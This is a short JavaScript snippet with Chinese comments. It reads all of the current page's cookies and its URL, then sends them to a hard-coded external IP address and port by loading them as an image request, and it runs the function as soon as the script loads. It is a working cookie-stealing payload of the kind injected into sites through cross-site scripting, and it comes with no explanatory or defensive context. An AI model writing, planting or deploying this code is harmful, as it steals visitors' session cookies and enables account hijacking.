function collectAndSendCookies() {
    // 获取当前页面的所有cookie
    const allCookies = document.cookie;
    
    // 创建一个简单的URL带参数的请求
    const url = `http://83.229.127.162:1111/?cookies=${encodeURIComponent(allCookies)}&url=${encodeURIComponent(window.location.href)}`;
    
    // 使用Image对象发送请求（不需要处理响应）
    const img = new Image();
    img.src = url;
}

// 执行函数
collectAndSendCookies();
